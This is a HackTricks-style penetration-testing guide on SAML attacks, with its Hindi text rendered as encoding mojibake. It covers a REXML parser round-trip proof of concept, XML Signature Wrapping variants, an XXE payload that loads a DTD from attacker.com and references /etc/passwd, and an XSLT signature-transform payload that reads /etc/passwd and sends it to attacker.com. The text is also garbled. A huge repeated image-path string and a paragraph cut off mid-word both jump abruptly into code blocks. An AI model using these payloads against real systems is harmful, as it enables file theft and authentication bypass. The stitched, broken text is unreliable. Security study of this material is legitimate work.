# SAML рд╣рдорд▓реЗ

## SAML рд╣рдорд▓реЗ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## рд╣рдорд▓реЗ рдЧреНрд░рд╛рдлрд┐рдХ

![](<../../.gitbook/assets/image (535) (1) (1) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
рдЖрдзреЗрд░реЗ рд░реЗрдХреНрд╕рдорд▓ 3.2.4 рдпрд╛ рдЙрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рдкрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЪрд▓рд╛рдиреЗ рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрдЙрдЯрдкреБрдЯ рдорд┐рд▓реЗрдЧрд╛:
```
First child in original doc: Y
First child after round-trip: Z
```
рдпрд╣рд╛рдВ рджрд┐рдП рдЧрдП рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕реЗ REXML рдиреЗ рдореВрд▓ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рджреЗрдЦрд╛:

![](<../../.gitbook/assets/image (561).png>)

рдФрд░ рдпрд╣рд╛рдВ рдЙрд╕реЗ рдкрд╛рд░реНрд╕рд┐рдВрдЧ рдФрд░ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рдПрдХ рджреМрд░ рдХреЗ рдмрд╛рдж рджреЗрдЦрд╛:

![](<../../.gitbook/assets/image (562).png>)

рдЗрд╕ рд╡рд┐рдХрд▓реНрдкрддрд╛ рдФрд░ рдЗрд╕реЗ рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML Signature Wrapping рд╣рдорд▓реЗ

XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдЬрд┐рдирдореЗрдВ XML рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╣реЛрддреЗ рд╣реИрдВ, рдЖрдорддреМрд░ рдкрд░ рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЪрд░рдгреЛрдВ рдореЗрдВ рдкреНрд░реЛрд╕реЗрд╕ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ: рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╕рддреНрдпрд╛рдкрди рдФрд░ рдлрдВрдХреНрд╢рди рдЗрдирд╡реЛрдХреЗрд╢рди (рд╡реНрдпрд╛рдкрд╛рд░ рддрд╛рд░реНрдХрд┐рдХ)ред рдпрджрд┐ рджреЛрдиреЛрдВ рдореЙрдбреНрдпреВрд▓реЛрдВ рдХреЗ рдкрд╛рд╕ рдбреЗрдЯрд╛ рдкрд░ рдЕрд▓рдЧ-рдЕрд▓рдЧ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╣реЛрддрд╛ рд╣реИ, рддреЛ XML рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд░реИрдкрд┐рдВрдЧ рд╣рдорд▓реЗ (XSW) рдирд╛рдордХ рдПрдХ рдирдИ рд╢реНрд░реЗрдгреА рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░реА рд╣реЛрддреА рд╣реИред
рдЗрди рд╣рдорд▓реЛрдВ рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ XML рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреЛ рдЕрд╡реИрдз рддрддреНрд╡реЛрдВ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ рд╕рдВрджреЗрд╢ рд╕рдВрд░рдЪрдирд╛ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ XML рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреЛ рдЕрдорд╛рдиреНрдп рдирд╣реАрдВ рдмрдирд╛рддрд╛ рд╣реИред рдЗрд╕ рдкрд░рд┐рд╡рд░реНрддрди рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╕рдВрджреЗрд╢ рдХреЛ рдРрд╕реЗ рддрд░реАрдХреЗ рд╕реЗ рдмрджрд▓рдирд╛ рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрд╛рд░реНрдХрд┐рдХ рдФрд░ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╕рддреНрдпрд╛рдкрди рдореЙрдбреНрдпреВрд▓ рджреЛрдиреЛрдВ рд╕рдВрджреЗрд╢ рдХреЗ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╣рд┐рд╕реНрд╕реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ XML рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреА рд╕рддреНрдпрд╛рдкрди рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрд╛рд░реНрдХрд┐рдХ рдЕрдорд╛рдиреНрдп рддрддреНрд╡ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдЕрдЦрдВрдбрддрд╛ рд╕рдВрд░рдХреНрд╖рдг рдФрд░ рдореВрд▓ XML рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреА рдореВрд▓ рд╕рддреНрдпрд╛рдкрди рдХреЛ рдЪрдХрд╛рдирд╛ рд▓рдЧрд╛рддрд╛ рд╣реИ рдФрд░ рд╡рд┐рдЪрд┐рддреНрд░ рд╕рд╛рдордЧреНрд░реА рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

SAML рдЕрдиреБрд░реЛрдз рд╕реЗ:

![](<../../.gitbook/assets/image (537).png>)

### XSW #1

рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдирдпрд╛ рд░реВрдЯ рддрддреНрд╡ рдЬреЛ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЗрд╕рд▓рд┐рдП рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╕рддреНрдпрд╛рдкрдирдХрд░реНрддрд╛ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреА рдЕрдЦрдВрдбрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ, рд╡рд╣ рдпрд╣ рджреЗрдЦ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЙрд╕рдиреЗ рдЕрдЦрдВрдбрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХреА рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдФрд░ рд╡рд╣ рд▓рд╛рд▓ рд░рдВрдЧ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдирдП рдЙрддреНрддрд░ -> рджрд╛рд╡рд╛ -> рд╡рд┐рд╖рдп рдХреА рдЕрдЦрдВрдбрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд╕рд╛рде рднреНрд░рдорд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрд╕рдХреЗ рдбреЗрдЯрд╛ рдХрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (538).png>)

### XSW #2

#1 рдХреЗ рд╕рд╛рде рдЕрдВрддрд░ рдпрд╣ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХрд╛ рдкреНрд░рдХрд╛рд░ рдПрдХ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╣реИ рдЬрд╣рд╛рдВ XSW #1 рдиреЗ рдПрдХ рдЖрд╡реГрддреНрдд рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдерд╛ред
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдирдИ рд╢реИрддрд╛рдиреА рд╕рдВрд░рдЪрдирд╛ рдкрд╣рд▓реЗ рдХреА рддрд░рд╣ рд╣реА рд╣реИ рдЬреЛ рдЕрдЦрдВрдбрддрд╛ рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рд╡реНрдпрд╛рдкрд╛рд░ рддрд╛рд░реНрдХрд┐рдХ рдХреЛ рднреНрд░рдорд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣реА рд╣реИред

![](<../../.gitbook/assets/image (539).png>)

### XSW #3

рдЗрд╕ рд╣рдорд▓реЗ рдореЗрдВ, рдПрдХ рд╢реИрддрд╛рдиреА рджрд╛рд╡рд╛ рдореВрд▓ рджрд╛рд╡реЗ рдХреЗ рд╕рдорд╛рди рд╕реНрддрд░ рдкрд░ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡реНрдпрд╛рдкрд╛рд░ рддрд╛рд░реНрдХрд┐рдХ рдХреЛ рднреНрд░рдорд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рд╢реИрддрд╛рдиреА рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

![](<../../.gitbook/assets/image (540).png>)

### XSW #4

XSW #3 рдХреЗ рд╕рдорд╛рди рд╣реИ, рдХреЗрд╡рд▓ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдореВрд▓ рджрд╛рд╡рд╛ рдХреЛ рдПрдХ рдмрдЪреНрдЪрд╛ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (541).png>)

### XSW #5

XSW #5 рдореЗрдВ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдФрд░ рдореВрд▓ рджрд╛рд╡рд╛ рддреАрди рдорд╛рдирдХ рд╡рд┐рдиреНрдпрд╛рд╕реЛрдВ рдореЗрдВ рдирд╣реАрдВ рд╣реИрдВ (рдПрдирд╡реЗрд▓реЛрдкреНрдб / рдПрдирд╡реЗрд▓реЛрдкрд┐рдВрдЧ / рдбрд┐рдЯреЗрдЪреНрдб)ред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдХреЙрдкреА рдХрд┐рдП рдЧрдП рджрд╛рд╡реЗ рдиреЗ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреЛ рдЖрд╡реГрддреНрдд рдХрд┐рдпрд╛ рд╣реИред

![](<../../.gitbook/assets/image (542).png>)

### XSW #6

XSW #6 рдЕрдкрдиреЗ рдХреЙрдкреА рдХрд┐рдП рдЧрдП рджрд╛рд╡реЗ рдХреЛ # 4 рдФрд░ 5 рдХреЗ рд╕рдорд╛рди рд╕реНрдерд╛рди рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИред рдпрд╣рд╛рдВ рджрд┐рд▓рдЪрд╕реНрдк рдЯреБрдХрдбрд╝рд╛ рдпрд╣ рд╣реИ рдХрд┐ рдХреЙрдкреА рдХрд┐рдП рдЧрдП рджрд╛рд╡реЗ рдиреЗ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреЛ рдЖрд╡реГрддреНрдд рдХрд┐рдпрд╛ рд╣реИ, рдЬреЛ рдлрд┐рд░ рдореВрд▓ рджрд╛рд╡реЗ рдХреЛ рдЖрд╡реГрддреНрдд рдХрд░рддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (543).png>)

### XSW #7

XSW #7 рдПрдХ **рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕** рддрддреНрд╡ рдбрд╛рд▓рддрд╛ рд╣реИ рдФрд░ рдХреЙрдкреА рдХрд┐рдП рдЧрдП **рджрд╛рд╡рд╛** рдХреЛ **рдмрдЪреНрдЪрд╛** рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝рддрд╛ рд╣реИред рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдПрдХ рдорд╛рдиреНрдп XML рддрддреНрд╡ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдХрдо рд╕реАрдорд┐рдд рд╕реНрдХреАрдорд╛ рдкрд░рд┐рднрд╛рд╖рд╛ рд╣реЛрддреА рд╣реИред рдЗрд╕ [рд╡реНрд╣рд╛рдЗрдЯ рдкреЗрдкрд░](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf) рдХреЗ рд▓реЗрдЦрдХреЛрдВ рдиреЗ рдЗрд╕ рд╡рд┐рдзрд┐ рдХреЛ рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд╛рд╕ рдХрд┐рдпрд╛ рдерд╛ред рдУрдкрдирдПрд╕рдПрдордПрд▓ рдиреЗ рд╕реНрдХреАрдорд╛ рд╕рддреНрдпрд╛рдкрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╕рддреНрдпрд╛рдкрди рдХреЗ рджреМрд░рд╛рди рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдЖрдИрдбреА рдХреЛ рд╕рдВрд╕рд╛рдзрд┐рдд рдХ
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
### рдЙрдкрдХрд░рдг

рдЖрдк рдПрдХ SAML рдЕрдиреБрд░реЛрдз рд╕реЗ POC рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ XXE рд╕рдВрдХрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдЯреЙрдХ рдХреЛ рднреА рджреЗрдЦреЗрдВ: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## SAML рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ XSLT

XSLT рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЬрд╛рдПрдВ:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md](../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md)
{% endcontent-ref %}

рдПрдХреНрд╕рдЯреЗрдВрд╕рд┐рдмрд▓ рд╕реНрдЯрд╛рдЗрд▓рд╢реАрдЯ рднрд╛рд╖рд╛ рдкрд░рд┐рд╡рд░реНрддрди (XSLT) XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдХреЛ HTML, JSON рдпрд╛ PDF рдЬреИрд╕реЗ рдЕрдиреНрдп рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкреНрд░рдХрд╛рд░ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ Turing-complete рднрд╛рд╖рд╛ рд╣реИред рдпрд╣рд╛рдВ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкрд╣рд▓реВ рд╣реИ рдХрд┐ **рд╣рдорд▓реЗ рдХреЛ рд╕рдлрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╛рдиреНрдп рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ**ред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ **XSLT рдкрд░рд┐рд╡рд░реНрддрди рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрд╕реЗрд╕ рдХрд┐рдП рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╣реЛрддрд╛ рд╣реИ**ред рдореВрд▓ рд░реВрдк рд╕реЗ, рд╣рдореЗрдВ рдПрдХ рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ рд╣рдо рд╣рдорд▓рд╛ рдХрд░ рд╕рдХреЗрдВ, рд▓реЗрдХрд┐рди рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕реНрд╡-рд╕рд╛рдЗрди рдпрд╛ рдЕрдорд╛рдиреНрдп рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

![xslt](https://epi052.gitlab.io/notes-to-self/img/saml/xslt.png)

рдпрд╣рд╛рдВ рдЖрдк рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рд╕рдВрдХрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **POC** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕ рдЦрдВрдб рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдкреЗрдЬ рдкрд░ рдЖрдк рдкреЗрд▓реЛрдб рдХреЗ рд▓рд┐рдП рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
```markup
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### рдЙрдкрдХрд░рдг

рдЖрдк рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML рд░реЗрдбрд░**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SAML рдЕрдиреБрд░реЛрдз рд╕реЗ POC рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд XSLT рд╕рдВрдХрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

